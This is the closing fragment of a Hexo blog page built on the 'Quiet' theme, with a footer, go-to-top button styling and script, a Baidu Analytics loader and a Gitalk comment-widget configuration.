			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/RamBree">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
            width: 40px;
            height: 40px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            transition: border .5s;
            border: 1px solid rgba(18, 24, 58, 0.06);

            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 20px;
            height: 20px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $( '#js-go_top' )
	.gotoTop( {
		offset: 500,
		speed: 300,
		animationShow: {
			'transform': 'translate(0,0)',
			'transition': 'transform .5s ease-in-out'
		},
		animationHide: {
			'transform': 'translate(100px,0)',
			'transition': 'transform .5s ease-in-out'
		}
	} );
</script>


<!-- Baidu Analytics -->
<script defer>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?f87362af66251bc3b7603e9ecfa19123";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>



    <!-- Gitalk -->
    <script>
        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
        const gitalk = new Gitalk({
            ...JSON.parse( data),
            id:location.pathname,
            distractionFreeMode:false
        })
        
        if(Boolean('false')){
            gitalk.render('gitalk-container')
        }
    </script>

<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>
</html>

